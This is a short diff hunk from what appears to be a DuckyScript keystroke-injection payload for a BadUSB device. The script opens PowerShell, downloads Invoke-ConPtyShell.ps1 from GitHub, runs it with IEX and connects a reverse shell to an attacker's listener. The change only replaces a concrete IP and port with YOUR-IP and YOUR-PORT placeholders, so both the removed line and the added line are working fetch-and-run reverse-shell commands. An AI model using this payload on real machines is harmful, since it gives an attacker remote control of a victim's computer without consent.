@@ -35,7 +35,7 @@ STRING powershell
 DELAY 500
 ENTER
 DELAY 500
-STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.16 4444
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell YOUR-IP YOUR-PORT
 DELAY 500
 ENTER
 DELAY 500
